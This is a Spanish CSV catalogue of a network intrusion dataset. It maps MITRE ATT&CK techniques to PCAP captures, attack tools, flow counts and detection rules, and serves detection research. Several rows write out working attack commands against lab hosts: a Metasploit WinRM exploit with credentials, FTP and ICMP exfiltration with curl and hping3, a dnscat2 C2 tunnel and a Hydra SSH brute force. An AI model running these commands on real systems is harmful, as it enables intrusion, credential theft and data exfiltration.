TÁCTICA,OTRAS TÁCTICAS,ID TÁCTICA,TÉCNICA,ID TÉCNICA,SUBTÉCNICA,ID SUBTÉCNICA,ATAQUE,HERRAMIENTA,FICHERO PCAP,PROTOCOLO BASE DE ATAQUE,Nº TOTAL DE FLUJOS,Nº DE FLUJOS CON ATAQUE/S,Nº DE FLUJOS CON ATAQUE/S COLATERAL/ES,Nº DE MENSAJES DE RED CON ATAQUE/S,Nº ATAQUES (INSTANCIAS) TOTALES,Nº ATAQUES (INSTANCIAS) PRINCIPALES,Nº ATAQUES (INSTANCIAS) COLATERALES,ATAQUE/S COLATERAL/ES - EXPLICACIÓN,DETECTABLE POR PATRONES,MECANISMO DE DETECCIÓN,DETALLES DE IMPLEMENTACIÓN DE ATAQUE,PROCESO DE GENERACIÓN DE PCAP,VALIDACIÓN DE PCAP,ANÁLISIS DE DETECCIONES DE PCAP (Snort),FORMATO PCAPNG,DETECTABILIDAD,ATAQUES COLATERALES,VERIFICACIÓN MTU MÁXIMA,ERROR TCP_REPLAY,CONTIENE SÓLO FLUJOS COMPLETOS CON SYN INICIAL,NIVEL DE ATAQUE (Contexto de Ataque),JUSTIFICACIÓN NIVEL DE ATAQUE (Contexto de Ataque),NIVEL DE ATAQUE (MODELO OSI),TRAMAS > 4000 Bytes,USADO PARA CÁLCULO DE CAPACIDAD DE DETECCIÓN
Discovery,-,TA0007,System Owner,T1033,-,-,Descubrimiento de sesión de usuario en equipo remoto,"quser, qwinsta",T1033-System_owner_[4].pcapng,DCERPC,13,1,0,1,1,1,0,-,SI,Regla que detecte múltiples interacciones con la API LSM_API_service del servicio RPC desde el mismo equipo origen.,-,Manual [4] / 3.12,Manual [4] / B.12,Manual [4] / 4.12,1,1,0,1,0,1,LV2,El descubrimiento de sesión del usuario en un equipo remoto puede tratarse de una actividad legítima en ciertos contextos,L3,0,1
Collection,-,TA0009,Data from Network Shared Drive,T1039,-,-,Descarga de archivos de interés disponibles en una red compartida,Comando Net Use,T1039-Data_from_network_shared_drive_[4].pcapng,SMB2,3,1,0,1,1,1,0,-,NO,"Detección por anomalías, copia repentina de ficheros compartidos por red.",-,Manual [4] / 3.15,Manual [4] / B.15,Manual [4] / 4.15,1,1,0,1,0,1,LV2,La extracción de datos de un disco compartido es legítimo en según qué contextos,L3,0,1
Credential Access,Discovery,TA0006,Network Sniffing,T1040,-,-,Falsa autenticación,Suite aircrack-ng,T1040-Autenticacion_[1].pcapng,802.11,1,1,0,1,1,1,0,-,NO,No existe detección posible ante este tipo de ataques. El uso de cifrado WEP incorpora vulnerabilidades intrínsecas a este.,-,Manual [1] / 4.2.1,Manual [1] / E.20,Manual [4] / 4.1.26,1,0,0,1,1,1,LV1,El acceso vía falsa autenticación siempre es un ataque,L2 (WEP),0,0
Credential Access,Discovery,TA0006,Network Sniffing,T1040,-,-,ChopChop,Suite aircrack-ng,T1040-Chopchop_[1].pcapng,802.11,1,1,0,1,1,1,0,-,NO,No existe detección posible ante este tipo de ataques. El uso de cifrado WEP incorpora vulnerabilidades intrínsecas a este.,-,Manual [1] / 4.2.2,Manual [1] / E.21,Manual [4] / 4.1.27,1,0,0,1,1,1,LV1,El uso de la técnica ChopChop siempre es un ataque,L2 (WEP),0,0
Credential Access,Discovery,TA0006,Network Sniffing,T1040,-,-,Fragmentación,Suite aircrack-ng,T1040-Fragmentacion_[1].pcapng,802.11,1,1,0,1,1,1,0,-,NO,No existe detección posible ante este tipo de ataques. El uso de cifrado WEP incorpora vulnerabilidades intrínsecas a este.,-,Manual [1] / 4.2.3,Manual [1] / E.22,Manual [4] / 4.1.28,1,0,0,1,1,1,LV1,El uso de la técnica Fragmentacion siempre es un ataque,L2 (WEP),0,0
Credential Access,Discovery,TA0006,Network Sniffing,T1040,-,-,Inundación MAC,Suite aircrack-ng,T1040-Mac_flood_[1].pcapng,IPv4,10674,10674,0,10683,10683,10683,0,-,NO*,"Regla personalizada que detecte un envío masivo de mensajes IPv4 con direcciones incorreladas con la red a proteger, y que aparenten ser completamente aleatorias",-,Manual [1] / 3.2,Manual [1] / E.1,Manual [4] / 4.1.29,1,1,0,1,1,1,LV1,Una inundacion MAC siempre es un ataque,L2 (Switch),0,0
Exfiltration,-,TA0010,Exfiltration Over C2 Channel,T1041,-,-,Exfiltración por canal C2,Caldera,T1041-exfiltration_over_c2_channel_[3].pcapng,HTTP,2,1,0,5,5,5,0,-,NO,Detección por anomalías basada en la sospecha de una extracción de información confidencial por un posible canal C2,-,Manual [3] / 3.8.14,Manual [3] / 3.8.14.4,Manual [3] / 3.8.14.5,1,1,0,1,0,0,LV1,La exfiltración de datos por un canal C2 siempre es un ataque,L3,0,1
Discovery,-,TA0007,Network Service Discovery,T1046,-,-,"Mútliples actividades de escaneo, incluidas el intento de Shell Remoto aprovechando el conocimiento de la red victima","Low Orbit Ion Canon (LOIC) for UDP, TCP, or HTTP requests",T1046-C2018_[6].pcapng,-,5,1,1,1,2,1,1,Shell Remoto - T1071,NO**,"En determinadas circunstancias, si el envío de paquetes constituye una amenaza de denegación de servicio, podría detectarse el envío masivo de paquetes",-,Dataset CIC-2018,Manual [4] / B.31,Dataset CIC-2018,1,1,0,1,0,1,LV1,Las actividades de escaneo son ataques,L3,0,0
Discovery,-,TA0007,Network Service Discovery,T1046,-,-,Descubrimiento de servicios y version,Nikto,T1046-Version_services_detection1_[3].pcapng,HTTP,160,159,0,6293,6293,6293,0,-,SI,"Múltiples mecanismos. Por ejemplo, regla que detecte un escaneo de puertos (alto número de peticiones hacia un rango de puertos en poco tiempo)",-,Manual [3] / 3.8.3,Manual [3] / 3.8.3.4,Manual [3] / 3.8.3.5,1,1,0,1,0,1,LV1,El descubrimiento de servicios y versiones se considera como ataque,L3,1,1
Discovery,-,TA0007,Network Service Discovery,T1046,-,-,Descubrimiento de servicios y version,nmap,T1046-Version_services_detection2_[3].pcapng,-,65681,65680,0,65737,65737,65737,0,-,SI,"Múltiples mecanismos. Por ejemplo, regla que detecte un escaneo de puertos (alto número de peticiones hacia un rango de puertos en poco tiempo)",-,Manual [3] / 3.8.3,Manual [3] / 3.8.3.4,Manual [3] / 3.8.3.5,1,1,0,1,0,0,LV1,El descubrimiento de servicios y versiones se considera como ataque,L3,0,1
Execution,-,TA0002,Windows Management Instrumentation,T1047,-,-,Ejecución de carga por WinRM,Metasploit,T1047-WinRM_[2].pcapng,HTTP,911,450,1,450,451,450,1,Establecimiento de sesión remota mediante Metasploit - T1059,SI,Regla genérica que detecte intento de ejecucion de código shell en un equipo aprovechando vulnerabilidades en WinRM,"Ejecucion de payload en un equipo mediante WinRM. Comando: msfconsole -x ""use exploit/windows/winrm/winrm_script_exec; set RHOSTS 192.168.2.2; set LHOST 192.168.1.3; set LPORT 5555; set username administrator; set password vagrant; set force_vbs true; run -z; sessions -c 'cmdkey /list'; sessions -k 1; exit""",Manual [2] / 3.1.4.1,Manual [4] / B.26,Manual [2] / 4.2.1.5,1,1,0,1,0,1,LV1,El aprovechamiento de la vulnerabilidad de la herramienta WinRM hace que este ataque siempre se comporte como tal (aunque la ejecución de código remoto también pueda darse en contextos legítimos),L3,1,1
Exfiltration,-,TA0010,Exfiltration Over Alternative Protocol,T1048,Exfiltration Over Unencrypted Non-C2 Protocol,T1048.003,Exfiltración por FTP,Caldera,T1048.003-Exfiltration_over_FTP_[3].pcapng,TCP,9,1,0,1,1,1,0,-,SI,Regla genérica que detecte FTP STOR,"Exfiltracion de datos utilizando el protocolo FTP. Utilizando caldera y la operacion Advanced Thief. Comando: curl -T stage_to_steal.tar.gz.gpg ftp://172.16.1.2/VictimDirectory/ --user ""dit:dit""",Manual [3] / 3.8.15,Manual [3] / 3.8.15.4,Manual [3] / 3.8.15.5,1,1,0,1,0,0,LV1,El uso de FTP para enviar datos se corresponde con un ataque,L3,0,1
Exfiltration,-,TA0010,Exfiltration Over Alternative Protocol,T1048,Exfiltration Over Unencrypted Non-C2 Protocol,T1048.003,Exfiltración por ICMP,hping3,T1048.003-Exfiltration_over_ICMP_[2].pcapng,ICMP,1,1,0,1,16,16,0,-,SI,Regla genérica que detecte PING inusual.,"Exfiltracion mediante protocolo ICMP. Envia varios echo Request que contienen como datos el contenido de ese fichero. Comando: echo ""Esto es un exfiltración sobre ICMP"" > file;timeout 15s hping3 --file ./file --data 36 192.168.2.2 --icmp",Manual [2] / 3.2.2.1,Manual [4] / B.27,Manual [2] / 4.2.2.2,1,1,0,1,0,1,LV1,El uso de ICMP para enviar datos se corresponde con un ataque,L3,0,1
Persistence,"Execution, Privilege Escalation",TA0003,Scheduled Task/Job,T1053,At,T1053.002,Ejecución de tarea mediante uso de comando at para programar la hora de la ejecución,"Caldera, At",T1053.002-Scheduled_TaskJob_At_[5].pcapng,HTTP,2,1,1,1,2,1,1,Establecimiento de sesión con herramienta Sandcat - T1059,SI,Regla genérica que detecte el uso de comando At para programar tareas a una determinada hora o momento,"El ataque consiste en ejecutar una orden en el equipo remoto mediante el uso de At, programando la hora de ejecución de dicha orden. De esta forma, puede obtenerse persistencia, por ejemplo.",Manual [5] / 4.3.3,Manual [5] / C.42,Manual [5] / 5.5.5,1,1,1,1,0,1,LV1,La programacion de una tarea no necesariamente tiene porque ser un ataque,L3,1,1
Defense Evasion,-,TA0005,Indicator Removal,T1070,Network Share Connection Removal,T1070.005,Eliminación de conexiones establecidas via Network Share en Windows,Comando Net Use,T1070-Indicator_removal_network_share_connection_removal_[4].pcapng,SMB2,1,1,0,1,1,1,0,-,NO,Detección por anomalías basada en desconexión repentina procedente de una dirección de varios recursos compartidos,-,Manual [4] / 3.8,Manual [4] / B.8,Manual [4] / 4.8,1,1,0,1,0,1,LV2,La eliminación de conexiones establecidas con Network Share de Windows es legítima en ciertos contextos,L3,0,1
Command and Control,-,TA0040,Application Layer Protocol,T1071,DNS,T1071.004,Command - Control via DNS,dnscat2,T1071-Tunel_[1].pcapng,DNS,200,10,0,204,204,204,0,-,SI,Regla genérica que detecta uso de dnscat,"Envio de peticiones DNS como canal de comunicaciones con la víctima. Comando: timeout 15s /root/dnscat2/client/dnscat --dns server=192.168.2.2,port=53 --secret= acabc17b6904a7f8fada4e7f8de4bce8 --no-encryption",Manual [1] / 5.2.3,Manual [1] / E.17,Manual [4] / 4.1.30,1,1,0,1,0,1,LV1,La ocultación de un canal C&C haciendo uso de un tunel DNS siempre es un ataque,L3,0,1
Discovery,-,TA0007,Account Discovery,T1087,Domain Account,T1087.002,Descubrimiento de cuentas de dominio en entorno Active Directory,"Caldera, net",T1087.002-AccountDiscovery_DomainAccount_[5].pcapng,HTTP,2,1,1,2,3,2,1,Establecimiento de sesión con herramienta Sandcat - T1059,SI,Regla genérica que detecte uso de comandos para enumerar los usuarios o grupos del dominio como net user /domain o net group /domain,Ejecución de comandos mediante CMD para enumerar usuarios y grupos del dominio,Manual [5] / 4.6.2,Manual [5] / C.44,Manual [5] / 5.8.6,1,1,1,1,0,1,LV2,El descubrimiento de cuentas de un dominio AD puede confundirse con actividades de un administrador de red,L3,1,1
Command and Control,-,TA0040,Proxy,T1090,Internal Proxy,T1090.001,Uso de Equipo interno como Proxy para el ataque C2,Covenant,T1090-Proxy_internal_proxy_[4].pcapng,HTTP,23,1,1,1,2,1,1,Establecimiento de canal C&C mediante Covenant - Command and Control,NO,"Aunque sí es detectable la conexión C2 directa con el atacante, no existe un mecanismo de detección concreto que pueda identificar el uso de un proxy, más allá de una detección por anomalías, como la repetición de paquetes, dando a entender que un equipo interno está replicando paquetes, y por tanto está actuando como proxy",-,Manual [4] / 3.20,Manual [4] / B.20,Manual [4] / 4.20,1,1,1,1,0,1,LV1,El uso de un equipo interno como Proxy para comunicaciones C&C siempre es ataque,L3,0,0
Command and Control,-,TA0040,Non-Application Layer Protocol,T1095,-,-,Usar un protocolo que no sea de la capa de Aplicacion en el modelo OSI para esconder la conexión de C2. En este caso utilizamos TCP,"Caldera, manx",T1095-Non_Application_Layer_[3].pcapng,TCP,2,1,1,1,2,1,1,Agente Caldera para el establecimiento de la sesión - Command and Control,SI,Regla genérica que detecte el envío de comandos o comunicaciones C&C en puertos no comunes o haciendo uso de servicios distintos de capa de aplicación,Utilizar la herramienta manx de Caldera para crear sesión C2 mediante TCP,Manual [3] / 3.8.13,Manual [3] / 3.8.13.4,Manual [3] / 3.8.13.5,1,1,1,1,0,1,LV1,El uso de un protocolo distinto de capa de aplicación para ataques C&C siempre es un ataque,L3,1,1
Command and Control,-,TA0040,Web Service,T1102,One-Way Communication,T1102.003,Subida de información confidencial a Workspace de Google Drive,"Covenant, Google Drive API",T1102.003-Web_service-one_way_communication_[4].pcapng,TLS,2,1,1,1,2,1,1,Establecimiento de canal C&C mediante Covenant - Command and Control,NO,"Detección por anomalías, observando actividad inusual relacionada con el uso de servicios web (subidas pesadas de información a la nube, comunicación periódica con servidores web concretos, etc)",-,Manual [4] / 3.21,Manual [4] / B.21,Manual [4] / 4.21,1,1,1,1,0,1,LV2,El uso de un servicio Web para subir datos puede confundirse a menudo con actividades legítimas,L3,1,1
Command and Control,-,TA0040,Multi-Stage Channels,T1104,-,-,Sesión Remota + Ataque C2,"RDP, Covenant",T1104-Multi_stage_channels_[4].pcapng,-,1,1,1,1,2,1,1,Establecimiento de canal C&C mediante Covenant - Command and Control,NO,Detección por anomalías. Investigación de las sesiones establecidas en el equipo atacante (siempre que sea posible) para identificar un rastro de otra dirección.,-,Manual [4] / 3.22,Manual [4] / B.22,Manual [4] / 4.22,1,0,1,1,0,1,LV1,El uso de varias fases y frentes de ataque en una comunicación C&C es siempre un ataque,L3,1,0
Command and Control,-,TA0040,Ingress Tool Transfer,T1105,-,-,Transferencia de archivos de un servidor C2 a un equipo previamente comprometido,"Metasploit, FTP",T1105-Ingress_Tool_Transfer_[5].pcapng,FTP,7,1,0,1,1,1,0,-,SI,"Reglas genéricas que detecten un traspaso de archivos entre equipos utilizando protocolos de transferencia de ficheros como SMB, FTP... Dependiendo de las circunstancias del ataque tambien es importante detectar la transferencia de archivos malware que sean detectables mediante tráfico de red.","Servidor FTP en el servidor C2. A través de la conexión del atacante a la víctima, usando el comando ftp transferimos herramientas desde el servidor C2 a la víctima",Manual [5] / 4.8.1,Manual [5] / C.2,Manual [5] / 5.11.7,1,1,0,1,0,1,LV1,La transferencia de herramientas de ingreso siempre es un ataque,L3,1,1
Credential Access,-,TA0006,Brute Force,T1110,Password Spraying,T1110.003,Ataque de fuerza bruta basado en diccionario de contraseñas,wifite,T1110-Diccionario_[1].pcapng,802.11,1,1,0,1,1,1,0,-,NO,-,-,Manual [1] / 4.2.7,Manual [1] / E.26,Manual [4] / 4.2.31,1,0,0,1,1,1,LV1,El uso de fuerza bruta mediante diccionario siempre es un ataque,L2 (WPA2),0,0
Credential Access,-,TA0006,Brute Force,T1110,Password Cracking,T1110.002,Ataque PMKID,"hashcat, hcxpcapngtool, hcxdumptool",T1110-pmkid_[1].pcapng,802.11,1,1,0,1,1,1,0,-,NO,-,-,Manual [1] / 4.2.6.3,Manual [1] / E.25,Manual [4] / 4.2.32,1,0,0,1,1,1,LV1,Un ataque PMKID siempre es un ataque,L2 (WPA2),0,0
Credential Access,-,TA0006,Brute Force,T1110,Password Cracking,T1110.002,PTW/KoreK/FMS,Suite aircrack-ng,T1110-Ptw_korek_[1].pcapng,802.11,1,1,0,1,1,1,0,-,NO,-,-,Manual [1] / 4.2.5,Manual [1] / E.24,Manual [4] / 4.1.33,1,0,0,1,1,1,LV1,Un ataque de fuerza bruta siempre es un ataque,L2 (WEP),0,0
Credential Access,-,TA0006,Brute Force,T1110,Password Guessing,T1110.001,Ataque sobre WPS,"wash, reaver",T1110-Wps_[1].pcapng,802.11,1,1,0,1,1,1,0,-,NO,-,-,Manual [1] / 4.2.8,Manual [1] / E.27,Manual [4] / 4.1.34,1,0,0,1,0,1,LV1,Un ataque de fuerza bruta siempre es un ataque,L2 (WPA2),0,0
Credential Access,-,TA0006,Brute Force,T1110,Password Guessing,T1110.001,Obtención de contraseña por fuerza bruta (adivinación),FTP - Patator,T1110.001-FTP-C2018_[6].pcapng,TCP,1,1,0,1,1,1,0,-,SI,Regla genérica que detecte un elevado número de intentos de acceso al servicio FTP de la víctima,-,Dataset CIC-2018,Manual [4] / B.32,Dataset CIC-2018,1,1,0,1,0,1,LV1,El uso de fuerza bruta para acceder via FTP a la víctima siempre es un ataque,L3,0,1
Credential Access,-,TA0006,Brute Force,T1110,Password Guessing,T1110.001,Obtención de contraseña por fuerza bruta (adivinación),Hydra,T1110.001-Hydra_[3].pcapng,SSH,1,1,0,1,1,1,0,-,SI,"Regla genérica que detecte un envío msaivo de peticiones de inicio de sesión SSH, alertando de un posible intento de acceso por fuerza bruta",Obtener la contraseña para conectarse por SSH al equipo victima mediante fuerza bruta. Comando: hydra -l dit -P pass.txt 172.16.2.2 -t 4 ssh,Manual [3] / 3.8.9,Manual [3] / 3.8.9.4,Manual [3] / 3.8.9.5,1,1,0,1,0,1,LV1,El uso de fuerza bruta para acceder via SSH a la víctima siempre es un ataque,L3,0,1
Credential Access,-,TA0006,Brute Force,T1110,Password Guessing,T1110.001,Obtención de contraseña por fuerza bruta (adivinación),SSH - Patator,T1110.001-SSH-C2018_[6].pcapng,SSH,1,1,0,1,1,1,0,-,SI,"Regla genérica que detecte un envío msaivo de peticiones de inicio de sesión SSH, alertando de un posible intento de acceso por fuerza bruta",-,Dataset CIC-2018,Manual [4] / B.33,Dataset CIC-2018,1,1,0,1,0,1,LV1,El uso de fuerza bruta para acceder via SSH a la víctima siempre es un ataque,L3,0,1
Defense Evasion,-,TA0005,Modify Registry,T1112,-,-,Modificación del Registro de forma remota,reg (Remoto),T1112-Modify_registry_[4].pcapng,WINREG,15,1,0,1,1,1,0,-,SI,Regla que detecte el envío de mensajes con protocolo WINREG o Remote Registry Service,-,Manual [4] / 3.9,Manual [4] / B.9,Manual [4] / 4.9,1,1,0,1,0,1,LV2,La modificación del registro de forma remota en ciertos contextos puede tratarse de actividad legítima,L3,0,1
Collection,-,TA0009,Email Collection,T1114,Remote Email Collection,T1114.002,Recolección de correos electrónicos de un servidor Microsoft Exchange haciendo uso de credenciales robadas,PowerShell,T1114-Email_collection_remote_email_collection_[4].pcapng,HTTP,10,3,0,3,3,3,0,-,SI,Regla genérica que detecte el intento de extracción de información relacionada con los correos electrónicos de una empresa alojados en un servidor Microsoft Exchange,-,Manual [4] / 3.16,Manual [4] / B.16,Manual [4] / 4.16,1,1,0,1,0,1,LV2,La recolección de correos electrónicos de un servidor Microsoft Exchange puede tratarse de una acción legítima en algunos contextos,L3,1,1
Command and Control,-,TA0040,Data Encoding,T1132,Standard Encoding,T1132.001,Codificacion de mensajes entre la victima y el C2 Server mediante Base64,"Metasploit, curl, base64",T1132.001-Standard_Encoding_[5].pcapng,HTTP,10,5,1,5,5,5,0,-,NO,Deteccion por anomalias,Servidor HTTP en el C2 Server. Intercambio de mensajes entre la victima y atacante mediante base64,Manual [5] / 4.8.2,Manual [5] / C.3,Manual [5] / 5.11.8,1,1,0,1,0,1,LV1,La codificación en base 64 de un canal c2 siempre es un ataque,L3,1,0
Initial Access,Persistence,TA0001,External Remote Services,T1133,-,-,Acceso a red VPN desde dispositivo no autorizado con credenciales robadas,OpenVPN,T1133-External_remote_services_[4].pcapng,-,32,1,0,1,1,1,0,-,NO***,"Existen varias variantes.
 Circunstancias concretas del ataque: el atacante realiza alguna interacción posterior una vez ha logrado acceder a la red (aplicable a esta técnica) como un escaneo de red o mensajes de anuncio de Host.
 Reglas personalizadas: regla que compruebe si las direcciones IP involucradas en los paquetes se corresponden con las autorizadas dentro de la red VPN (debe ser configurada manualmente).
","Acceso a red VPN, sin interacciones adicionales más allá de las naturales al propio acceso",Manual [4] / 3.3,Manual [4] / B.3,Manual [4] / 4.3,1,1,0,1,0,1,LV2,El acceso a una red VPN es una acción legítima en algunos contextos,L3,0,0
Persistence,-,TA0003,Browser Extensions,T1176,-,-,Instalación de Plugin en Navegador Chrome que reenvía información relacionada con búsquedas del usuario a un servidor,Malicious-browser-extension,T1176-Browser-extension_[4].pcapng,HTTP,217,212,0,212,212,212,0,-,NO,"Detección por anomalías basada en flujos de datos hacia direcciones no relacionadas con las búsquedas, normalmente en formato de objetos JavaScript",-,Manual [4] / 3.7,Manual [4] / B.7,Manual [4] / 4.7,1,1,0,1,0,1,LV1,El uso de una extensión maliciosa que publica información confidencial siempre es un ataque,L3,0,0
